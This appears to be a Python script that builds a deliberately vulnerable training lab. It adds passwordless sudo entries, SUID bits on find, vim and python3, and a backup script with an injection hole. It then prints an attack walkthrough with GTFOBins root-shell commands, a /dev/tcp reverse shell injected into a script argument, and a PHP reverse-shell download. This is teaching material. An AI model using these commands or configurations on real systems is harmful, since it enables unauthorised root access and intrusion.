#!/usr/bin/env python3
"""
Enhanced setup script for a complete attack chain demonstration.
This script sets up:
1. Additional vulnerable services (like FTP with anonymous login)
2. Multiple privilege escalation vectors using common GTFObins binaries
3. Hidden flags and sensitive information
4. Complete demo environment for reconnaissance to root
"""

import os
import stat
import sys
import subprocess
import random
import string
import shutil
import argparse
from pathlib import Path

# Configuration
ROOT_FLAG_CONTENT = "FLAG{c0ngr4tul4t10ns_y0u_h4v3_r00t_4cc3ss}"
USER_FLAG_CONTENT = "FLAG{y0u_f0und_th3_us3r_fl4g_n0w_try_f0r_r00t}"
BACKUP_SCRIPT_PATH = "/tmp/backup_app.sh"
ROOT_FLAG_PATH = "/root/root_flag.txt"
USER_FLAG_PATH = "restricted/flag.txt"
CREDENTIALS_FILE = "/tmp/old_credentials.txt"

# Banner for script
BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║  ███████╗███████╗████████╗██╗   ██╗██████╗                    ║
║  ██╔════╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗                   ║
║  ███████╗█████╗     ██║   ██║   ██║██████╔╝                   ║
║  ╚════██║██╔══╝     ██║   ██║   ██║██╔═══╝                    ║
║  ███████║███████╗   ██║   ╚██████╔╝██║                        ║
║  ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝                        ║
║                                                               ║
║  Enhanced Attack Chain Demo Environment                       ║
║  Complete Penetration Testing Lab from Recon to Root          ║
╚═══════════════════════════════════════════════════════════════╝
"""

# Terminal colors
def create_colored_text(text, color_code):
    """Create colored text for terminal output"""
    return f"\033[{color_code}m{text}\033[0m"

def print_info(message):
    """Print information message"""
    print(create_colored_text("[*] " + message, "34"))

def print_success(message):
    """Print success message"""
    print(create_colored_text("[+] " + message, "32"))

def print_error(message):
    """Print error message"""
    print(create_colored_text("[-] " + message, "31"))

def print_warning(message):
    """Print warning message"""
    print(create_colored_text("[!] " + message, "33"))

def check_sudo():
    """Check if script is running with sudo privileges"""
    if os.geteuid() != 0:
        print_error("This script must be run with sudo privileges")
        print_info("Please run: sudo python3 enhanced_setup.py")
        sys.exit(1)

def create_vulnerable_backup_script():
    """Create a backup script with command injection vulnerability"""
    print_info("Creating vulnerable backup script...")
    script_content = """#!/bin/bash
# This script backs up the web application
# VULNERABILITY: This script is allowed to run as root via sudo without password
# and contains command injection in the filename parameter

APP_DIR="."
BACKUP_DIR="/tmp"

# Get backup name from parameter or use default
BACKUP_NAME="${1:-backup_$(date +%s)}"

echo "[+] Backing up application..."
tar czf "$BACKUP_DIR/$BACKUP_NAME.tar.gz" "$APP_DIR" 2>/dev/null

# Clean up old backups - VULNERABLE to command injection!
echo "[+] Cleaning up old backups matching pattern: $BACKUP_NAME"
find "$BACKUP_DIR" -name "*$BACKUP_NAME*" -type f -mtime +7 -delete 2>/dev/null

echo "[+] Backup process completed"
"""
    
    with open(BACKUP_SCRIPT_PATH, 'w') as f:
        f.write(script_content)
    
    # Make it executable
    os.chmod(BACKUP_SCRIPT_PATH, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    print_success(f"Created backup script at {BACKUP_SCRIPT_PATH}")

def create_flags_and_sensitive_data():
    """Create flags and sensitive data files"""
    print_info("Creating flags and sensitive data...")
    
    # Create user flag
    if not os.path.exists("restricted"):
        os.makedirs("restricted")
    
    with open(USER_FLAG_PATH, 'w') as f:
        f.write(USER_FLAG_CONTENT)
    print_success(f"Created user flag at {USER_FLAG_PATH}")
    
    # Create root flag
    try:
        with open(ROOT_FLAG_PATH, 'w') as f:
            f.write(ROOT_FLAG_CONTENT)
        print_success(f"Created root flag at {ROOT_FLAG_PATH}")
    except Exception as e:
        print_error(f"Failed to create root flag: {e}")
    
    # Create fake credentials file in /tmp
    with open(CREDENTIALS_FILE, 'w') as f:
        f.write("""# Old database credentials - DO NOT USE IN PRODUCTION!
DB_USER=dbadmin
DB_PASS=Password123!
DB_HOST=localhost
DB_NAME=webapp_db

# API Keys
API_KEY_PROD=sk_live_51Ks93jDKs39sKDKs99KdkS93
API_KEY_DEV=sk_test_51Ks93jDKs39sKDKs99KdkS93

# Admin credentials (old)
ADMIN_USER=admin
ADMIN_PASS=admin123
""")
    print_success(f"Created fake credentials file at {CREDENTIALS_FILE}")

def configure_sudo_privileges(privesc_method):
    """Configure sudo to allow privilege escalation"""
    print_info(f"Configuring sudo for '{privesc_method}' privilege escalation method...")
    
    sudo_configs = {
        "backup": "www-data ALL=(ALL) NOPASSWD: /tmp/backup_app.sh",
        "find": "www-data ALL=(ALL) NOPASSWD: /usr/bin/find",
        "python": "www-data ALL=(ALL) NOPASSWD: /usr/bin/python3",
        "perl": "www-data ALL=(ALL) NOPASSWD: /usr/bin/perl",
        "vim": "www-data ALL=(ALL) NOPASSWD: /usr/bin/vim",
        "all": "www-data ALL=(ALL) NOPASSWD: /tmp/backup_app.sh, /usr/bin/find, /usr/bin/python3, /usr/bin/perl, /usr/bin/vim"
    }
    
    if privesc_method not in sudo_configs:
        print_error(f"Unknown privilege escalation method: {privesc_method}")
        print_info("Available methods: " + ", ".join(sudo_configs.keys()))
        return False
    
    try:
        # Create a new sudoers file
        sudoers_file = "/etc/sudoers.d/vulnerable_app"
        with open(sudoers_file, 'w') as f:
            f.write(sudo_configs[privesc_method] + "\n")
        os.chmod(sudoers_file, 0o440)
        print_success(f"Configured sudo for www-data user in {sudoers_file}")
        return True
    except Exception as e:
        print_error(f"Failed to configure sudo: {e}")
        return False

def modify_suid_binary(suid_enabled):
    """Set or remove SUID bit from common binaries for GTFObins exploitation"""
    if not suid_enabled:
        print_info("Skipping SUID binary setup")
        return
        
    binaries = ['/usr/bin/find', '/usr/bin/vim', '/usr/bin/python3']
    for binary in binaries:
        if os.path.exists(binary):
            try:
                current_perms = os.stat(binary).st_mode
                os.chmod(binary, current_perms | stat.S_ISUID)
                print_success(f"Set SUID bit on {binary}")
            except Exception as e:
                print_error(f"Failed to set SUID on {binary}: {e}")

def show_gtfobins_commands(privesc_method):
    """Display GTFObins commands for the chosen privilege escalation method"""
    gtfobins = {
        "backup": """
# Backup script command injection:
sudo /tmp/backup_app.sh '; /bin/bash; echo'

# Alternatively, to get a reverse shell as root:
sudo /tmp/backup_app.sh '$(bash -c "bash -i >& /dev/tcp/YOUR_IP/5555 0>&1")'
""",
        "find": """
# Find GTFObins method:
sudo find . -exec /bin/sh -p \\; -quit
""",
        "python": """
# Python GTFObins method:
sudo python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
""",
        "perl": """
# Perl GTFObins method:
sudo perl -e 'exec "/bin/sh";'
""",
        "vim": """
# Vim GTFObins method:
sudo vim -c ':!/bin/sh'
""",
        "all": """
# Multiple methods available:

# 1. Backup script:
sudo /tmp/backup_app.sh '; /bin/bash; echo'

# 2. Find:
sudo find . -exec /bin/sh -p \\; -quit

# 3. Python:
sudo python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# 4. Perl:
sudo perl -e 'exec "/bin/sh";'

# 5. Vim:
sudo vim -c ':!/bin/sh'
"""
    }
    
    return gtfobins.get(privesc_method, "No GTFObins commands available for this method")

def display_instructions(privesc_method, include_nmap, include_suid):
    """Display instructions for the demo"""
    your_ip = subprocess.check_output("hostname -I | awk '{print $1}'", shell=True).decode().strip()
    if not your_ip:
        your_ip = "YOUR_IP"
    
    print("\n" + "=" * 70)
    print(create_colored_text("COMPLETE ATTACK CHAIN DEMO - INSTRUCTIONS", "1;36"))
    print("=" * 70)
    
    print(f"""
The following has been set up for your demonstration:

1. User flag at: restricted/flag.txt
2. Root flag at: /root/root_flag.txt
3. Sensitive data at: {CREDENTIALS_FILE}
4. Privilege escalation vector: {privesc_method} method
{f"5. SUID binaries are set up for escalation" if include_suid else ""}

COMPLETE ATTACK CHAIN DEMONSTRATION:

Step 1: Reconnaissance
   {'- Run Nmap scans to discover services and ports' if include_nmap else '- Navigate to the web application'}
   - Map out the attack surface
   - Identify vulnerabilities

Step 2: Exploit Web Vulnerabilities
   - Demonstrate SQL Injection at /login
   - Show XSS in the comments section
   - Show Path Traversal in the file upload section
   
Step 3: Get a Reverse Shell
   - Download a reverse shell: 
     wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
   - Edit it to use your IP address: {your_ip}
   - Upload it using the path traversal vulnerability
   - Set up a listener: nc -lvnp 4444
   - Access the shell by loading the uploaded PHP file

Step 4: Privilege Escalation
   - From the reverse shell, run: sudo -l
   - Visit GTFObins.github.io to show privilege escalation techniques
   - Use the privileges to escalate to root
{show_gtfobins_commands(privesc_method)}

Step 5: Find the Root Flag
   - From the root shell, access: cat {ROOT_FLAG_PATH}
   - Display the flag to prove you have root access

For a realistic demo, setup TWO terminals:
1. First terminal: Run your netcat listener for the reverse shell
2. Second terminal: For demonstration purposes (showing commands, GTFObins, etc.)

Remember to explain the following during your presentation:
- How vulnerabilities are discovered
- How they can be chained together
- How privilege escalation works
- How this would be prevented in a real environment
""")
    print("=" * 70)
    print("")

def main():
    """Main function"""
    print(BANNER)
    print_warning("This script will set up a complete attack chain demo environment.")
    print_warning("It should ONLY be used in isolated, controlled environments!")
    
    # Parse arguments
    parser = argparse.ArgumentParser(description="Set up a vulnerable environment for penetration testing demonstrations")
    parser.add_argument("--privesc", choices=["backup", "find", "python", "perl", "vim", "all"], default="backup", 
                       help="Privilege escalation method to set up (default: backup)")
    parser.add_argument("--suid", action="store_true", help="Set SUID bit on some binaries (find, python, etc.)")
    parser.add_argument("--nmap", action="store_true", help="Include extra services for Nmap scanning")
    args = parser.parse_args()
    
    # Check if running with sudo
    check_sudo()
    
    # Create the vulnerable backup script
    create_vulnerable_backup_script()
    
    # Create flags and sensitive data
    create_flags_and_sensitive_data()
    
    # Configure sudo privileges
    configure_sudo_privileges(args.privesc)
    
    # Setup SUID binaries if requested
    modify_suid_binary(args.suid)
    
    # Handle additional services for Nmap if requested
    if args.nmap:
        print_info("Additional services for Nmap demonstration would be configured here")
        print_info("For a complete demo, consider running this in Docker with multiple services")
    
    # Display instructions
    display_instructions(args.privesc, args.nmap, args.suid)

if __name__ == "__main__":
    main() 